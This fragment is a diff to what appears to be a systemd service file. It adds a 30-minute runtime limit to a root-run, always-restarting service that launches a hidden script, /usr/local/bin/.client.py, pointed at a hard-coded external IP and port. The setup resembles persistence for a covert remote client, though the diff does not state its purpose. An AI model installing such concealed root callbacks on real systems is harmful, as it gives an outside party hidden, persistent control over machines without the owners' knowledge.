@@ -8,6 +8,7 @@ User=root
 Type=simple
 Restart=always
 RestartSec=1
+RuntimeMaxSec=30m
 ExecStart=mmap /usr/local/bin/.client.py 129.21.49.57 8765
 
 [Install]
